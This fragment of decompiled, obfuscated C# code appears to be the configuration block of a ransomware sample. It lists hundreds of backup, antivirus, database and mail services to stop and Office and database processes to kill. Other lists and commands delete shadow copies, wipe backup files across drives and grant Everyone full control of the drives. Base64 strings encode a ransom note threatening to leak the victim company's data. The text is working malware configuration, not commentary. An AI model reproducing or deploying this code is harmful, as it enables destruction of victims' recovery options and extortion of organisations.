			"stop ccEvtMgr /y", "stop ccSetMgr /y", "stop SavRoam /y", "stop RTVscan /y", "stop QBFCService /y", "stop QBIDPService /y", "stop Intuit.QuickBooks.FCS /y", "stop QBCFMonitorService /y", "stop YooBackup /y", "stop YooIT /y",
			"stop zhudongfangyu /y", "stop stc_raw_agent /y", "stop VSNAPVSS /y", "stop VeeamTransportSvc /y", "stop VeeamDeploymentService /y", "stop VeeamNFSSvc /y", "stop veeam /y", "stop PDVFSService /y", "stop BackupExecVSSProvider /y", "stop BackupExecAgentAccelerator /y",
			"stop BackupExecAgentBrowser /y", "stop BackupExecDiveciMediaService /y", "stop BackupExecJobEngine /y", "stop BackupExecManagementService /y", "stop BackupExecRPCService /y", "stop AcrSch2Svc /y", "stop AcronisAgent /y", "stop CASAD2DWebSvc /y", "stop CAARCUpdateSvc /y", "stop sophos /y",
			"stop “Acronis VSS Provider” /y", "stop MsDtsServer /y", "stop IISAdmin /y", "stop MSExchangeES /y", "stop “Sophos Agent” /y", "stop EraserSvc11710 /y", "stop “Enterprise Client Service” /y", "stop “SQL Backups /y", "stop MsDtsServer100 /y", "stop NetMsmqActivator /y",
			"stop MSExchangeIS /y", "stop “Sophos AutoUpdate Service” /y", "stop SamSs /y", "stop ReportServer /y", "stop “SQLsafe Backup Service” /y", "stop MsDtsServer110 /y", "stop POP3Svc /y", "stop MSExchangeMGMT /y", "stop “Sophos Clean Service” /y", "stop SMTPSvc /y",
			"stop ReportServer$SQL_2008 /y", "stop “SQLsafe Filter Service” /y", "stop msftesql$PROD /y", "stop SstpSvc /y", "stop MSExchangeMTA /y", "stop “Sophos Device Control Service” /y", "stop ReportServer$SYSTEM_BGC /y", "stop “Symantec System Recovery” /y", "stop MSOLAP$SQL_2008 /y", "stop UI0Detect /y",
			"stop MSExchangeSA /y", "stop “Sophos File Scanner Service” /y", "stop ReportServer$TPS /y", "stop “Veeam Backup Catalog Data Service” /y", "stop MSOLAP$SYSTEM_BGC /y", "stop W3Svc /y", "stop MSExchangeSRS /y", "stop “Sophos Health Service” /y", "stop ReportServer$TPSAMA /y", "stop “Zoolz 2 Service” /y",
			"stop MSOLAP$TPS /y", "stop “aphidmonitorservice” /y", "stop msexchangeadtopology /y", "stop “Sophos MCS Agent” /y", "stop AcrSch2Svc /y", "stop MSOLAP$TPSAMA /y", "stop “intel(r) proset monitoring service” /y", "stop msexchangeimap4 /y", "stop “Sophos MCS Client” /y", "stop ARSM /y",
			"stop MSSQL$BKUPEXEC /y", "stop unistoresvc_1af40a /y", "stop “Sophos Message Router” /y", "stop BackupExecAgentAccelerator /y", "stop MSSQL$ECWDB2 /y", "stop audioendpointbuilder /y", "stop “Sophos Safestore Service” /y", "stop BackupExecAgentBrowser /y", "stop MSSQL$PRACTICEMGT /y", "stop “Sophos System Protection Service” /y",
			"stop BackupExecDeviceMediaService /y", "stop MSSQL$PRACTTICEBGC /y", "stop “Sophos Web Control Service” /y", "stop BackupExecJobEngine /y", "stop MSSQL$PROD /y", "stop AcronisAgent /y", "stop BackupExecManagementService /y", "stop MSSQL$PROFXENGAGEMENT /y", "stop Antivirus /y", "stop BackupExecRPCService /y",
			"stop MSSQL$SBSMONITORING /", "stop MSSQL$SBSMONITORING /y", "stop AVP /y", "stop BackupExecVSSProvider /y", "stop MSSQL$SHAREPOINT /y", "stop DCAgent /y", "stop bedbg /y", "stop MSSQL$SQL_2008 /y", "stop EhttpSrv /y", "stop MMS /y",
			"stop MSSQL$SQLEXPRESS /y", "stop ekrn /y", "stop mozyprobackup /y", "stop MSSQL$SYSTEM_BGC /y", "stop EPSecurityService /y", "stop MSSQL$VEEAMSQL2008R2 /y", "stop MSSQL$TPS /y", "stop EPUpdateService /y", "stop ntrtscan /y", "stop MSSQL$TPSAMA /y",
			"stop EsgShKernel /y", "stop PDVFSService /y", "stop MSSQL$VEEAMSQL2008R2 /y", "stop ESHASRV /y", "stop SDRSVC /y", "stop MSSQL$VEEAMSQL2012 /y", "stop FA_Scheduler /y", "stop SQLAgent$VEEAMSQL2008R2 /y", "stop MSSQLFDLauncher$PROFXENGAGEMENT /y", "stop KAVFS /y",
			"stop SQLWriter /y", "stop MSSQLFDLauncher$SBSMONITORING /y", "stop KAVFSGT /y", "stop VeeamBackupSvc /y", "stop MSSQLFDLauncher$SHAREPOINT /y", "stop kavfsslp /y", "stop VeeamBrokerSvc /y", "stop MSSQLFDLauncher$SQL_2008 /y", "stop klnagent /y", "stop VeeamCatalogSvc /y",
			"stop MSSQLFDLauncher$SYSTEM_BGC /y", "stop macmnsvc /y", "stop VeeamCloudSvc /y", "stop MSSQLFDLauncher$TPS /y", "stop masvc /y", "stop VeeamDeploymentService /y", "stop MSSQLFDLauncher$TPSAMA /y", "stop MBAMService /y", "stop VeeamDeploySvc /y", "stop MSSQLSERVER /y",
			"stop MBEndpointAgent /y", "stop VeeamEnterpriseManagerSvc /y", "stop MSSQLServerADHelper /y", "stop McAfeeEngineService /y", "stop VeeamHvIntegrationSvc /y", "stop MSSQLServerADHelper100 /y", "stop McAfeeFramework /y", "stop VeeamMountSvc /y", "stop MSSQLServerOLAPService /y", "stop McAfeeFrameworkMcAfeeFramework /y",
			"stop VeeamNFSSvc /y", "stop MySQL57 /y", "stop McShield /y", "stop VeeamRESTSvc /y", "stop MySQL80 /y", "stop McTaskManager /y", "stop VeeamTransportSvc /y", "stop OracleClientCache80 /y", "stop mfefire /y", "stop wbengine /y",
			"stop ReportServer$SQL_2008 /y", "stop mfemms /y", "stop wbengine /y", "stop RESvc /y", "stop mfevtp /y", "stop sms_site_sql_backup /y", "stop SQLAgent$BKUPEXEC /y", "stop MSSQL$SOPHOS /y", "stop SQLAgent$CITRIX_METAFRAME /y", "stop sacsvr /y",
			"stop SQLAgent$CXDB /y", "stop SAVAdminService /y", "stop SQLAgent$ECWDB2 /y", "stop SAVService /y", "stop SQLAgent$PRACTTICEBGC /y", "stop SepMasterService /y", "stop SQLAgent$PRACTTICEMGT /y", "stop ShMonitor /y", "stop SQLAgent$PROD /y", "stop Smcinst /y",
			"stop SQLAgent$PROFXENGAGEMENT /y", "stop SmcService /y", "stop SQLAgent$SBSMONITORING /y", "stop SntpService /y", "stop SQLAgent$SHAREPOINT /y", "stop sophossps /y", "stop SQLAgent$SQL_2008 /y", "stop SQLAgent$SOPHOS /y", "stop SQLAgent$SQLEXPRESS /y", "stop svcGenericHost /y",
			"stop SQLAgent$SYSTEM_BGC /y", "stop swi_filter /y", "stop SQLAgent$TPS /y", "stop swi_service /y", "stop SQLAgent$TPSAMA /y", "stop swi_update /y", "stop SQLAgent$VEEAMSQL2008R2 /y", "stop swi_update_64 /y", "stop SQLAgent$VEEAMSQL2012 /y", "stop TmCCSF /y",
			"stop SQLBrowser /y", "stop tmlisten /y", "stop SQLSafeOLRService /y", "stop TrueKey /y", "stop SQLSERVERAGENT /y", "stop TrueKeyScheduler /y", "stop SQLTELEMETRY /y", "stop TrueKeyServiceHelper /y", "stop SQLTELEMETRY$ECWDB2 /y", "stop WRSVC /y",
			"stop mssql$vim_sqlexp /y", "stop vapiendpoint /y"
		};
		VfIRuRDoHW = new List<string> { "config Dnscache start= auto", "config FDResPub start= auto", "config SSDPSRV start= auto", "config upnphost start= auto", "config SQLTELEMETRY start= disabled", "config SQLTELEMETRY$ECWDB2 start= disabled", "config SQLWriter start= disabled", "config SstpSvc start= disabled" };
		ZSMEaXFyFht = new List<string>
		{
			"/IM mspub.exe /F", "/IM mydesktopqos.exe /F", "/IM mydesktopservice.exe /F", "/IM mysqld.exe /F", "/IM sqbcoreservice.exe /F", "/IM firefoxconfig.exe /F", "/IM agntsvc.exe /F", "/IM thebat.exe /F", "/IM steam.exe /F", "/IM encsvc.exe /F",
			"/IM excel.exe /F", "/IM CNTAoSMgr.exe /F", "/IM sqlwriter.exe /F", "/IM tbirdconfig.exe /F", "/IM dbeng50.exe /F", "/IM thebat64.exe /F", "/IM ocomm.exe /F", "/IM infopath.exe /F", "/IM mbamtray.exe /F", "/IM zoolz.exe /F",
			"IM thunderbird.exe /F", "/IM dbsnmp.exe /F", "/IM xfssvccon.exe /F", "/IM mspub.exe /F", "/IM Ntrtscan.exe /F", "/IM isqlplussvc.exe /F", "/IM onenote.exe /F", "/IM PccNTMon.exe /F", "/IM msaccess.exe /F", "/IM outlook.exe /F",
			"/IM tmlisten.exe /F", "/IM msftesql.exe /F", "/IM powerpnt.exe /F", "/IM mydesktopqos.exe /F", "/IM visio.exe /F", "/IM mydesktopservice.exe /F", "/IM winword.exe /F", "/IM mysqld-nt.exe /F", "/IM wordpad.exe /F", "/IM mysqld-opt.exe /F",
			"/IM ocautoupds.exe /F", "/IM ocssd.exe /F", "/IM oracle.exe /F", "/IM sqlagent.exe /F", "/IM sqlbrowser.exe /F", "/IM sqlservr.exe /F", "/IM synctime.exe /F"
		};
		f00000a = new List<string>
		{
			"Delete Shadows /all /quiet", "resize shadowstorage /for=c: /on=c: /maxsize=401MB", "resize shadowstorage /for=c: /on=c: /maxsize=unbounded", "resize shadowstorage /for=d: /on=d: /maxsize=401MB", "resize shadowstorage /for=d: /on=d: /maxsize=unbounded", "resize shadowstorage /for=e: /on=e: /maxsize=401MB", "resize shadowstorage /for=e: /on=e: /maxsize=unbounded", "resize shadowstorage /for=f: /on=f: /maxsize=401MB", "resize shadowstorage /for=f: /on=f: /maxsize=unbounded", "resize shadowstorage /for=g: /on=g: /maxsize=401MB",
			"resize shadowstorage /for=g: /on=g: /maxsize=unbounded", "resize shadowstorage /for=h: /on=h: /maxsize=401MB", "resize shadowstorage /for=h: /on=h: /maxsize=unbounded", "Delete Shadows /all /quiet"
		};
		edpjkmWiBB = "Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_Delete(); }";
		pmzwKqsyDlmmF = new List<string> { "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk", "/s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk", "/s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk", "/s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk", "/s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk", "/s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk" };
		f00000b = new List<string> { "\"C:*\" /grant Everyone:F /T /C /Q", "\"D:*\" /grant Everyone:F /T /C /Q", "\"Z:*\" /grant Everyone:F /T /C /Q" };
		aYqzBWQifeA = "NO";
		f00000c = "NO";
		f00000d = new DateTime(2000, 1, 1);
		f00000e = new DateTime(2100, 1, 1);
		f00000f = "YES";
		f000010 = "10";
		f000011 = "NO";
		fNMfifGmoXya = "NO";
		rPQFiVwCriY = "NO";
		yrIyoHrzWDCT = "YES";
		NwrSvcEHBCxFfoz = "NO";
		f000012 = "NO";
		f000013 = new List<string> { "docx", "pdf", "xlsx", "csv" };
		f000014 = "NO";
		f000015 = "1";
		MSbkqSPZNmrgShe = "NO";
		f000016 = "NO";
		f000017 = "NO";
		fKcZCslCfAJPz = string.Empty;
		KWarveAlrUeLj = "NO";
		CvhuRhPbSX = "NO";
		f000018 = "YES";
		f000019 = "WU9VUiBDT01QQU5ZIElTIEhBQ0tFRCBBTkQgQ09NUFJPTUlTRUQ=";
		EiyrcFiAoaX = "WW91ciBuZXR3b3JrIHdhcyBBVFRBQ0tFRCwgeW91ciBjb21wdXRlcnMgYW5kIHNlcnZlcnMgd2VyZSBMT0NLRUQsDQpZb3VyIHByaXZhdGUgZGF0YSB3YXMgRE9XTkxPQURFRDoNCiAtIENvbnRyYWN0cw0KIC0gQ3VzdG9tZXJzIGRhdGENCiAtIEZpbmFuY2UNCiAtIEhSDQogLSBEYXRhYmFzZXMNCiAtIEFuZCBtb3JlIG90aGVyLi4uDQoNCklmIHlvdSBkbyBub3QgY29udGFjdCB1cyBpbiB0aGUgbmV4dCAzIERBWVMgd2Ugd2lsbCBiZWdpbiBEQVRBIHB1YmxpY2F0aW9uLg0KV2Ugd2lsbCBwb3N0IGluZm9ybWF0aW9uIGFib3V0IGhhY2tpbmcgb2YgeW91ciBjb21wYW55IG9uIG91ciB0d2l0dGVyIGh0dHBzOi8vdHdpdHRlci5jb20vUm9iaW5Ib29kTGVha3Mgb3IgaHR0cHM6Ly9wYXJsZXIuY29tL3VzZXIvUm9iaW5Ib29kTGVha3MNCg0KWW91IGNhbiBmaW5kIGZ1bGwgZGV0YWlscyBpbiB0aGUgZmlsZSBSRVNUT1JFX0ZJTEVTX0lORk8=";
		f00001a = "NO";
		SbkfEriDLMxWh = "NO";
		f00001b = "NO";
		NMKbJRePeNuLz = "NO";
		OIjqWZRpNdE = "NO";
		f00001c = "LOGONISOFF";
		f00001d = "NO";
		XoculucrhuBC = "NO";
		RoiBxbbYOpTnzdF = "reload1.lnk";
		f00001e = "NO";
		f00001f = "NO";
		cuUuUUMpmxH = "NO";
		f000020 = "NO";
		nmjDhIwEGnMOrO = "VGhhbm9z";
		aYrdlpstiAwAZTu = "YES";
		nqNdPWHffReq = "YES";
		f000021 = "NO";
		f000022 = "NO";
		YacSoacXjaCUC = new string[0];
		QtTrkEhpkGUJgMO = "YES";
		uBIPmjbCjNt = true;
		f000023 = "YES";
		PAOJgADrbjEa = true;
		hxCcwpobkJC = false;
		FRIhZgoxuuhF = false;
		f000024 = false;
		f000025 = "Debug_Log.txt";
		CCDyMIHlAe = false;
		f000026 = false;
		f000027 = false;
		f000028 = false;
		UOlZmEwYRBbnfmvt = true;
		muQSQoYNOwJp = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + "" + ".txt";
		f000029 = true;
		lBGXxmsJjqv = new Stopwatch();
		f00002a = 0;
		f00002b = 0;
		YazilaoopZ = false;
		f00002c = ".[ID-]";
		caYhozbaifo = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };
		KlnqoelvmWHjj = new List<string>();
		f00002d = 0;
		RaNDyCdUClri = true;
		f00002e = false;
		CoyMCdqKPDBfCk = false;
		f00002f = false;
		f000030 = false;
	}
}
